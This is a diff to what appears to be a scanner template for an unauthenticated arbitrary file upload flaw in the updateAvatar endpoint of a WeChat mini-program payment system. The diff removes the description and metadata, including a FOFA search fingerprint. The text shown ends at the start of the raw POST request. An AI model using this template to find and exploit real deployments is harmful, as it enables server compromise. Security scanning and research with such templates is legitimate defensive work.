@@ -3,12 +3,8 @@ info:
   name: A2425美团代付三合一微信小程序系统updateAvatar 前台任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/eqrz0wf5m065g506'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: eqrz0wf5m065g506
-    fofa: '"/h5/static/js/chunk-vendors.js"'
 http:
 - raw:
   - 'POST /index.login/updateAvatar HTTP/1.1
